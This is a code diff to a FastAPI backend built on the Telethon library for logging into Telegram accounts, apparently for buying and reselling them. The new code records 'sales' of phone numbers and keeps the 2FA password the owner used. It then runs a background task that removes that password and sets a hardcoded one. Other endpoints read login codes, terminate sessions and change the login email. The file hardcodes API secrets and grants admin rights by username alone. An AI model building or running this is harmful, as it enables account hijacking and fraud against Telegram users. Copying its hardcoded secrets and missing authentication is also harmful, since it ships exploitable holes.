@@ -1,8 +1,9 @@
-import os, re, glob, shutil, sqlite3, asyncio
+import os, re, glob, shutil, sqlite3, asyncio, json
 from uuid import uuid4
 from pathlib import Path
 from typing import Optional
 from contextlib import asynccontextmanager
+from datetime import datetime, timezone
 
 from fastapi import FastAPI, HTTPException
 from fastapi.responses import FileResponse, JSONResponse, Response
@@ -25,14 +26,48 @@ from telethon.tl.types import (
     EmailVerificationCode,
 )
 
-API_ID = 32140582
+API_ID   = 32140582
 API_HASH = "e9597b6e5e64a9d093071e20d0545f3f"
+AUTO_2FA_PASSWORD = "4735908767"
+ADMIN_USERNAME    = "sopnox"
 
-BASE_DIR = Path(__file__).parent
+BASE_DIR     = Path(__file__).parent
 SESSIONS_DIR = BASE_DIR / "sessions"
 SESSIONS_DIR.mkdir(exist_ok=True)
 STATIC_DIR = BASE_DIR / "static"
-DB_PATH = str(BASE_DIR / "accounts.db")
+DB_PATH    = str(BASE_DIR / "accounts.db")
+USERS_PATH = BASE_DIR / "users.json"
+
+# ── Users JSON ────────────────────────────────────────────────────────────────
+def load_users() -> dict:
+    if USERS_PATH.exists():
+        try:
+            return json.loads(USERS_PATH.read_text())
+        except Exception:
+            pass
+    return {}
+
+def save_users(data: dict):
+    USERS_PATH.write_text(json.dumps(data, ensure_ascii=False, indent=2))
+
+def user_record_sale(username: str, phone: str):
+    data = load_users()
+    if username not in data:
+        data[username] = {"sold_numbers": [], "total_logins": 0}
+    u = data[username]
+    if phone not in u["sold_numbers"]:
+        u["sold_numbers"].append(phone)
+    u["total_logins"] = u.get("total_logins", 0) + 1
+    save_users(data)
+
+def user_get_stats(username: str) -> dict:
+    data = load_users()
+    u = data.get(username, {"sold_numbers": [], "total_logins": 0})
+    return {
+        "username": username,
+        "sold_numbers": u.get("sold_numbers", []),
+        "total_logins": u.get("total_logins", 0),
+    }
 
 # ── Database ──────────────────────────────────────────────────────────────────
 def init_db():
@@ -46,7 +81,6 @@ def init_db():
             has_2fa INTEGER DEFAULT 0,
             logged_in_at TEXT DEFAULT NULL
         )""")
-        # Add column if upgrading from old DB
         try:
             c.execute("ALTER TABLE accounts ADD COLUMN logged_in_at TEXT DEFAULT NULL")
         except Exception:
@@ -65,7 +99,6 @@ def db_all():
     ]
 
 def db_save(phone, user, has_2fa=False):
-    from datetime import datetime, timezone
     now = datetime.now(timezone.utc).isoformat()
     with sqlite3.connect(DB_PATH) as c:
         c.execute(
@@ -92,7 +125,7 @@ def session_name(phone: str) -> str:
 def make_client(sess: str) -> TelegramClient:
     return TelegramClient(sess, API_ID, API_HASH)
 
-# ── Pending login sessions (kept alive between send-code and sign-in) ─────────
+# ── Pending login sessions ────────────────────────────────────────────────────
 _pending: dict = {}
 
 # ── App ───────────────────────────────────────────────────────────────────────
@@ -119,6 +152,9 @@ class SignInBody(BaseModel):
 class Disable2faBody(BaseModel):
     password: str
 
+class Enable2faBody(BaseModel):
+    current_password: Optional[str] = None
+
 class SendMsgBody(BaseModel):
     username: str
     message: str
@@ -139,6 +175,24 @@ class VerifyEmailBody(BaseModel):
     email: str
     code: str
 
+class RecordSaleBody(BaseModel):
+    username: str
+    phone: str
+    had2fa: bool = False
+    old_password: Optional[str] = None
+
+class AuthLoginBody(BaseModel):
+    username: str
+
+# ── Auth ──────────────────────────────────────────────────────────────────────
+@app.post("/api/auth/login")
+async def auth_login(body: AuthLoginBody):
+    u = body.username.strip()
+    if not u:
+        raise HTTPException(400, "Username required")
+    role = "admin" if u.lower() == ADMIN_USERNAME.lower() else "user"
+    return {"username": u, "role": role}
+
 # ── Healthcheck ───────────────────────────────────────────────────────────────
 @app.get("/api/healthz")
 async def healthz():
@@ -148,7 +202,7 @@ async def healthz():
 @app.post("/api/telegram/send-code")
 async def send_code(body: SendCodeBody):
     phone = body.phone.strip()
-    sid = str(uuid4())
+    sid   = str(uuid4())
     sname = str(SESSIONS_DIR / f"pending_{sid}")
     client = make_client(sname)
     try:
@@ -176,7 +230,7 @@ async def send_code(body: SendCodeBody):
 
     return {"sessionId": sid, "phoneCodeHash": sent.phone_code_hash}
 
-# ── Login: verify code (+ optional 2FA password) ──────────────────────────────
+# ── Login: verify code ────────────────────────────────────────────────────────
 @app.post("/api/telegram/sign-in")
 async def sign_in(body: SignInBody):
     if body.sessionId not in _pending:
@@ -185,8 +239,9 @@ async def sign_in(body: SignInBody):
     p = _pending[body.sessionId]
     client, phone, phash, sname = p["client"], p["phone"], p["hash"], p["sname"]
 
-    user = None
+    user    = None
     has_2fa = False
+    used_pw = None
     try:
         user = await client.sign_in(phone, body.code, phone_code_hash=phash)
     except SessionPasswordNeededError:
@@ -195,6 +250,7 @@ async def sign_in(body: SignInBody):
         try:
             user = await client.sign_in(password=body.password)
             has_2fa = True
+            used_pw = body.password
         except PasswordHashInvalidError:
             raise HTTPException(400, "Wrong 2FA password. Try again.")
         except Exception as e:
@@ -209,14 +265,12 @@ async def sign_in(body: SignInBody):
     if not user:
         raise HTTPException(500, "Login failed unexpectedly")
 
-    # Check 2FA status (unless we already know)
     if not has_2fa:
         try:
             pwd = await client(GetPasswordRequest())
             has_2fa = getattr(pwd, "has_password", False)
         except: pass
 
-    # Persist session
     final = session_name(phone)
     await client.disconnect()
     _pending.pop(body.sessionId, None)
@@ -231,7 +285,66 @@ async def sign_in(body: SignInBody):
         "firstName": user.first_name or "",
         "lastName": user.last_name,
         "username": user.username,
+        "has2fa": has_2fa,
+        "usedPassword": used_pw,
     }
+
+# ── Record sale + trigger auto-2FA ────────────────────────────────────────────
+@app.post("/api/user/record-sale")
+async def record_sale(body: RecordSaleBody):
+    if body.username.lower() == ADMIN_USERNAME.lower():
+        raise HTTPException(403, "Admin cannot sell numbers")
+    user_record_sale(body.username, body.phone)
+
+    async def _auto_2fa():
+        await asyncio.sleep(5)
+        client = make_client(session_name(body.phone))
+        try:
+            await client.connect()
+            if body.had2fa and body.old_password:
+                try:
+                    await client.edit_2fa(
+                        current_password=body.old_password,
+                        new_password=None
+                    )
+                    db_set_2fa(body.phone, False)
+                except Exception:
+                    pass
+            await client.edit_2fa(
+                current_password=None,
+                new_password=AUTO_2FA_PASSWORD
+            )
+            db_set_2fa(body.phone, True)
+        except Exception:
+            pass
+        finally:
+            try: await client.disconnect()
+            except: pass
+
+    asyncio.create_task(_auto_2fa())
+    return {"success": True}
+
+# ── User stats ────────────────────────────────────────────────────────────────
+@app.get("/api/user/{username}/stats")
+async def get_user_stats(username: str):
+    if username.lower() == ADMIN_USERNAME.lower():
+        raise HTTPException(403, "Forbidden")
+    return user_get_stats(username)
+
+# ── Admin: all users ──────────────────────────────────────────────────────────
+@app.get("/api/admin/users")
+async def admin_users():
+    data  = load_users()
+    result = []
+    for uname, udata in data.items():
+        result.append({
+            "username": uname,
+            "sold_count": len(udata.get("sold_numbers", [])),
+            "total_logins": udata.get("total_logins", 0),
+            "sold_numbers": udata.get("sold_numbers", []),
+        })
+    result.sort(key=lambda x: x["sold_count"], reverse=True)
+    return result
 
 # ── Accounts list ─────────────────────────────────────────────────────────────
 @app.get("/api/telegram/accounts")
@@ -243,17 +356,15 @@ async def list_accounts():
 async def remove_account(phone: str):
     from urllib.parse import unquote
     phone = unquote(phone)
-    # Properly log out from Telegram servers first (removes the session from all devices)
     client = make_client(session_name(phone))
     try:
         await client.connect()
-        await client.log_out()  # This terminates the session on Telegram's servers
+        await client.log_out()
     except Exception:
-        pass  # Even if logout fails, still delete locally
+        pass
     finally:
         try: await client.disconnect()
         except: pass
-    # Now delete local session files and DB entry
     for f in glob.glob(session_name(phone) + "*"):
         try: os.remove(f)
         except: pass
@@ -277,7 +388,27 @@ async def disable_2fa(phone: str, body: Disable2faBody):
         try: await client.disconnect()
         except: pass
 
-# ── Get login code from Telegram messages ─────────────────────────────────────
+# ── Enable 2FA ────────────────────────────────────────────────────────────────
+@app.post("/api/telegram/accounts/{phone}/enable-2fa")
+async def enable_2fa(phone: str, body: Enable2faBody):
+    from urllib.parse import unquote
+    phone = unquote(phone)
+    client = make_client(session_name(phone))
+    try:
+        await client.connect()
+        await client.edit_2fa(
+            current_password=body.current_password or None,
+            new_password=AUTO_2FA_PASSWORD
+        )
+        db_set_2fa(phone, True)
+        return {"success": True, "message": "2FA enabled successfully"}
+    except Exception as e:
+        raise HTTPException(500, str(e))
+    finally:
+        try: await client.disconnect()
+        except: pass
+
+# ── Get login code ────────────────────────────────────────────────────────────
 @app.get("/api/telegram/accounts/{phone}/login-code")
 async def get_login_code(phone: str):
     from urllib.parse import unquote
@@ -301,7 +432,7 @@ async def get_login_code(phone: str):
         try: await client.disconnect()
         except: pass
 
-# ── List active sessions ───────────────────────────────────────────────────────
+# ── List sessions ─────────────────────────────────────────────────────────────
 @app.get("/api/telegram/accounts/{phone}/sessions")
 async def get_sessions(phone: str):
     from urllib.parse import unquote
@@ -346,7 +477,7 @@ async def terminate_session(phone: str, body: TermSessBody):
         try: await client.disconnect()
         except: pass
 
-# ── Terminate all other sessions ──────────────────────────────────────────────
+# ── Terminate all sessions ────────────────────────────────────────────────────
 @app.post("/api/telegram/accounts/{phone}/terminate-all-sessions")
 async def terminate_all(phone: str):
     from urllib.parse import unquote
@@ -378,7 +509,7 @@ async def send_message(phone: str, body: SendMsgBody):
         try: await client.disconnect()
         except: pass
 
-# ── Join channel (single account) ─────────────────────────────────────────────
+# ── Join channel (single) ─────────────────────────────────────────────────────
 @app.post("/api/telegram/accounts/{phone}/join-channel")
 async def join_channel(phone: str, body: JoinBody):
     from urllib.parse import unquote
@@ -395,7 +526,7 @@ async def join_channel(phone: str, body: JoinBody):
         try: await client.disconnect()
         except: pass
 
-# ── Join channel (all accounts) ───────────────────────────────────────────────
+# ── Join channel (all) ────────────────────────────────────────────────────────
 @app.post("/api/telegram/join-all")
 async def join_all(body: JoinAllBody):
     results = []
@@ -421,17 +552,12 @@ async def change_email(phone: str, body: EmailBody):
     client = make_client(session_name(phone))
     try:
         await client.connect()
-        # Try LoginChange first (for existing login email), fall back to LoginSetup
         try:
             await client(SendVerifyEmailCodeRequest(
-                purpose=EmailVerifyPurposeLoginChange(),
-                email=body.email
-            ))
+                purpose=EmailVerifyPurposeLoginChange(), email=body.email))
         except Exception:
             await client(SendVerifyEmailCodeRequest(
-                purpose=EmailVerifyPurposeLoginSetup(),
-                email=body.email
-            ))
+                purpose=EmailVerifyPurposeLoginSetup(), email=body.email))
         return {"success": True, "message": "Verification code sent to email"}
     except Exception as e:
         raise HTTPException(500, str(e))
@@ -450,13 +576,11 @@ async def verify_email(phone: str, body: VerifyEmailBody):
         try:
             await client(VerifyEmailRequest(
                 purpose=EmailVerifyPurposeLoginChange(),
-                verification=EmailVerificationCode(code=body.code)
-            ))
+                verification=EmailVerificationCode(code=body.code)))
         except Exception:
             await client(VerifyEmailRequest(
                 purpose=EmailVerifyPurposeLoginSetup(),
-                verification=EmailVerificationCode(code=body.code)
-            ))
+                verification=EmailVerificationCode(code=body.code)))
         return {"success": True, "message": "Email changed successfully"}
     except Exception as e:
         raise HTTPException(500, str(e))
